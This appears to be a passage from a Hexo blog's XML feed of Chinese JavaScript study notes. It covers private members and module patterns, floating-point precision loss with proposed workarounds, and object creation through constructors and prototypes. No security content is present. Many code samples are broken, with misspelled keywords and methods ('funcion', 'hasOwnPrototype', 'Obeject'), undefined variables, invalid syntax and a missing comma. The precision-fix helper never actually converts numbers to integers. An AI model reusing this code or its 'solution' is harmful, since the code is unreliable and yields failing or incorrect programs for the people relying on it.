class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVariable = 10;</span><br><span class="line">    function privateFunction()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权方法</span><br><span class="line">    this.publicMethod = function()&#123;</span><br><span class="line">        privateVariable ++;</span><br><span class="line">        return privateFunction();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用私有和特权成员，可以隐藏那些不应该被直接修改的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">funcion Person(name)&#123;</span><br><span class="line">    this.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.setName = funcion(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&quot;Nicholas&quot;);</span><br><span class="line">alert(person.getName());   //&quot;Nicholas&quot;</span><br><span class="line">person.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person.getName());  //&quot;Greg&quot;</span><br></pre></td></tr></table></figure></p><p>在构造函数外部没有办法访问name</p><h3 id="静态私有变量"><a href="#静态私有变量" class="headerlink" title="静态私有变量"></a>静态私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFunc()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //构造函数</span><br><span class="line">    MyObject = function()&#123;</span><br><span class="line">    &#125;;   //没有使用var，所以声明的是全局的类</span><br><span class="line">    //公有/特权方法</span><br><span class="line">    MyObject.prototype.publicMethod = function()&#123;</span><br><span class="line">        privateVar ++;</span><br><span class="line">        return privateFunc();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>该模式与构造函数定义区别在于，其私有变量和函数是由实例共享的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var name = &quot;&quot;;</span><br><span class="line">    Person = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.setName = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line">var person2 = new Person(&quot;Van&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Van&quot;</span><br><span class="line">person1.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Greg&quot;</span><br><span class="line">var person2 = new Person(&quot;John&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;John&quot;</span><br><span class="line">alert(person2.getName());  //&quot;John&quot;</span><br><span class="line">//name为共享属性</span><br></pre></td></tr></table></figure></p><h3 id="模块模式"><a href="#模块模式" class="headerlink" title="模块模式"></a>模块模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权/公有方法和属性</span><br><span class="line">    return&#123;</span><br><span class="line">        publicProperty : true,</span><br><span class="line">        publicMethod ：function()&#123;</span><br><span class="line">            privateVar++;</span><br><span class="line">            return privateFunc();</span><br><span class="line">        &#125;  //对象字面量是单例的公共接口</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><h3 id="增强的模块模式"><a href="#增强的模块模式" class="headerlink" title="增强的模块模式"></a>增强的模块模式</h3><p>增强模块模式适合那些单例必须是某种类型的实例，同时还必须增加某些属性和方法对其加以增强的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    var object = new CustomType();</span><br><span class="line">    object.publicProperty = true;</span><br><span class="line">    object.publicMethod = function()&#123;</span><br><span class="line">        privateVar++;</span><br><span class="line">        return privateFun();</span><br><span class="line">    &#125;;</span><br><span class="line">    return object;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS精度丢失问题</title>
      <link href="/JS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html"/>
      <url>/JS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<p>最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了<code>parseFloat()</code>方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。</p><a id="more"></a><h2 id="JS浮点数精度丢失的原因"><a href="#JS浮点数精度丢失的原因" class="headerlink" title="JS浮点数精度丢失的原因"></a>JS浮点数精度丢失的原因</h2><p>由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。</p><p><img src="../assets/20190330/1.jpg" alt="Alt text"></p><ul><li>1位用来表示符号位</li><li>11位用来表示指数</li><li>52位表示尾数</li></ul><p>因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）</span><br><span class="line">0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环）</span><br></pre></td></tr></table></figure><p>当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。</p><p>而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9007199254740992     &gt;&gt; 10000000000000...000 // 共计 53 个 0</span><br><span class="line">9007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 0</span><br><span class="line">9007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 0</span><br><span class="line">9007199254740992 + 1 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 2 // 未丢失      //9007199254740994   </span><br><span class="line">9007199254740992 + 3 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 4 // 未丢失      //9007199254740996</span><br></pre></td></tr></table></figure><p>由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。</p><p>在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。</p><h2 id="常见的出错场合"><a href="#常见的出错场合" class="headerlink" title="常见的出错场合"></a>常见的出错场合</h2><h3 id="浮点数计算、比较："><a href="#浮点数计算、比较：" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.1 + 0.2 != 0.3 // true</span><br></pre></td></tr></table></figure><h3 id="大整数计算、比较："><a href="#大整数计算、比较：" class="headerlink" title="大整数计算、比较："></a>大整数计算、比较：</h3><p>普通的整数计算比较不太容易出错，除非计算范围超出 Math.pow(2, 53)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999 == 10000000000000001 // true</span><br></pre></td></tr></table></figure><h3 id="多位数字符数值转换："><a href="#多位数字符数值转换：" class="headerlink" title="多位数字符数值转换："></a>多位数字符数值转换：</h3><p>这种情况在一些金额的计算中较容易出现，但也是最容易被忽视的一种，当用户在输入框中输入一个位数较多的字符串（不仅仅包含大数值，小数点后位数过长也包含在这一案例中），并在前台使用JS将其转换为数值，得到的结果往往是四舍五入带有偏差的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parseFloat(0.9);    //0.9</span><br><span class="line">parseFloat(9999999999999999.9)    //10000000000000000</span><br><span class="line">parseInt(&quot;9999999999999999&quot;);    //10000000000000000</span><br><span class="line">parseFloat(9.999999999999999);   //10</span><br></pre></td></tr></table></figure><h3 id="toFixed不会四舍五入："><a href="#toFixed不会四舍五入：" class="headerlink" title="toFixed不会四舍五入："></a>toFixed不会四舍五入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var num = 1.335;</span><br><span class="line">num.toFixed(2);   //1.33</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="浮点数计算、比较：-1"><a href="#浮点数计算、比较：-1" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><p>通常解决这一问题，采用的都是将浮点部分转换成整数后进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//浮点数转换为整数</span><br><span class="line">function toInt(num)&#123;</span><br><span class="line">    var rel = &#123;&#125;;</span><br><span class="line">    var str,pos,len,times;</span><br><span class="line">    str = (num &lt; 0) ? -num + &apos;&apos; : num + &apos;&apos;; </span><br><span class="line">    pos = str.indexOf(&apos;.&apos;);</span><br><span class="line">    len = str.substr(pos+1).length;</span><br><span class="line">    times = Math.pow(10, len);</span><br><span class="line">    rel.times = times;</span><br><span class="line">    rel.num =  num;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//计算过程</span><br><span class="line">function operate(a,b,op)&#123;</span><br><span class="line">    var d1 = toInt(a);</span><br><span class="line">    var d2 = toInt(b);</span><br><span class="line">    var max = d1.times &gt; d2.times ? d1.times : d2.times;</span><br><span class="line">    var rel;</span><br><span class="line">    switch(op)&#123;</span><br><span class="line">        case &quot;+&quot; :</span><br><span class="line">            rel = (d1.num * max + d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;-&quot; :</span><br><span class="line">            rel = (d1.num * max - d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;*&quot; :</span><br><span class="line">            rel = ((d1.num * max) * (d2.num * max)) / (max * max);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;/&quot; :</span><br><span class="line">            rel = (d1.num * max) / (d2.num * max);</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rel = operate(0.3,0.1,&quot;+&quot;);   //0.4</span><br></pre></td></tr></table></figure><h3 id="多位数数值转换："><a href="#多位数数值转换：" class="headerlink" title="多位数数值转换："></a>多位数数值转换：</h3><p>前台不对这类字符串进行数值转换，传到后台后，由后台进行处理</p><h3 id="toFix的修复："><a href="#toFix的修复：" class="headerlink" title="toFix的修复："></a>toFix的修复：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function toFixed(num, s) &#123;</span><br><span class="line">    var times = Math.pow(10, s)</span><br><span class="line">    var des = num * times + 0.5</span><br><span class="line">    des = parseInt(des, 10) / times</span><br><span class="line">    return des + &apos;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS面向对象程序设计</title>
      <link href="/JS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html"/>
      <url>/JS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html</url>
      
        <content type="html"><![CDATA[<h2 id="属性类型"><a href="#属性类型" class="headerlink" title="属性类型"></a>属性类型</h2><h3 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否通过delete删除属性从而重新定义属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Writable]]</td><td style="text-align:left">表示能否修改属性的值，默认为true</td></tr><tr><td style="text-align:left">[[Value]]</td><td style="text-align:left">包含这个属性的数值，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;&#125;;</span><br><span class="line">Object.defineProperty(person,&quot;name&quot;,&#123;</span><br><span class="line">    writable: false,</span><br><span class="line">    value: &quot;Nicholas&quot;</span><br><span class="line">&#125;);</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;</span><br><span class="line">person.name = &quot;Greg&quot;;</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;,通过修改属性使之不能被修改</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Get]]</td><td style="text-align:left">在读取属性时调用的函数，默认为undefined</td></tr><tr><td style="text-align:left">[[Set]]</td><td style="text-align:left">在写入属性时调用的函数，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;</span><br><span class="line">    _year: 2004,</span><br><span class="line">    edition: 1</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(book,&quot;year&quot;,&#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        return this._year;</span><br><span class="line">    &#125;</span><br><span class="line">    set: function(newValue)&#123;</span><br><span class="line">        if(newVale &gt; 2004)&#123;</span><br><span class="line">            this._year = newValue;</span><br><span class="line">            this.edition += newValue - 2004;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">book.year = 2005;</span><br><span class="line">alert(book.edition);  // 2,访问属性只能用Object.defineProperty定义</span><br></pre></td></tr></table></figure><h3 id="定义多个属性"><a href="#定义多个属性" class="headerlink" title="定义多个属性"></a>定义多个属性</h3><p>使用Object.defineProperty方法定义多个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;&#125;;</span><br><span class="line">Object.defineProperty(book,&#123;</span><br><span class="line">    _year: &#123;</span><br><span class="line">        writable: true,</span><br><span class="line">        value: 2004</span><br><span class="line">    &#125;,</span><br><span class="line">    edition: &#123;</span><br><span class="line">        wirtable: true,</span><br><span class="line">        value: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="读取属性的特性"><a href="#读取属性的特性" class="headerlink" title="读取属性的特性"></a>读取属性的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);</span><br><span class="line">alert(descriptor.value);  //2004</span><br><span class="line">alert(descriptor.configurable);   //false</span><br><span class="line">alert(typeof descriptor.get);    //&quot;undefined&quot;</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>抽象了创建具体对象的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.age = age;</span><br><span class="line">    o.job = job;</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br><span class="line"></span><br><span class="line">// 使用call实现在特殊作用于中调用Person函数</span><br><span class="line">var o = new Object();</span><br><span class="line">Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);</span><br><span class="line">o.sayName();   //&quot;Kristen&quot;</span><br></pre></td></tr></table></figure><p>此方法特点：</p><ul><li>没有显示地创建对象</li><li>直接将属性方法赋给了his对象</li><li>没有return语句</li><li>不同实例上的同名函数每次都是新创建初始化，他们之间不相等<br>最好将函数定义转移到构造函数外</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = sayName;</span><br><span class="line">&#125;</span><br><span class="line">function sayName()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br></pre></td></tr></table></figure><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><p>创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.name = &quot;Nicholas&quot;;</span><br><span class="line">Person.prototype.age = 29;</span><br><span class="line">Person.prototype.job = &quot;Software Engineer&quot;;</span><br><span class="line">Person.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">person1.sayName();   //&quot;Nicholas&quot;,来自原型</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324153411.png" alt="Alt text"></p><p>可以通过isPrototypeOf来确定对象之间是否存在这种关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Person.prototype.isPrototypeOf(person1));   //true</span><br><span class="line">alert(Person.getPrototypeOf(person) == Person.prototype);   //true</span><br><span class="line">alert(Obeject.getPrototypeOf(person1).name);   //&quot;Nicholas&quot;</span><br></pre></td></tr></table></figure><p>可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br><span class="line">person1.name = &quot;Greg&quot;;</span><br><span class="line">alert(person1.name);   //&quot;Greg&quot;,来自实例</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //true</span><br><span class="line">delete person1.name;</span><br><span class="line">alert(person1.name);   //&quot;Nicholas&quot;,来自原型</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br></pre></td></tr></table></figure><p>in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;name&quot; in person1);   //true</span><br></pre></td></tr></table></figure><p>for-in循环，返回的是所有能够通过对象访问、可枚举的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    toString: function()&#123;</span><br><span class="line">        return &quot;My Object&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">for(var prop in o)&#123;</span><br><span class="line">    if(pop == &quot;toString&quot;)&#123;</span><br><span class="line">        alert(&quot;Found toString&quot;);   //IE中不会显示，认为原型中的toString被屏蔽</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Object.key可以取得所有可枚举的实力属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var keys = Object.keys(Person.prototype);</span><br><span class="line">alert(keys);   //&quot;name,age,job,sayName&quot;</span><br><span class="line">var p1 = new Person();</span><br><span class="line">p1.name = &quot;Rob&quot;;</span><br><span class="line">p1.age = 31;</span><br><span class="line">var p1Keys = Object.keys(p1);</span><br><span class="line">alert(p1Keys);   //&quot;name,age&quot;</span><br></pre></td></tr></table></figure><p>更简单的原型创建语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person</span><br></pre></td></tr></table></figure><p>对原型对象所做的修改可以立即从实例上反映出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype.sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br><span class="line">friends.sayHi();   //&quot;Hi&quot;</span><br></pre></td></tr></table></figure><p>但重写整个原型对象就不可以了，此时constructor指向新创建的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    name: 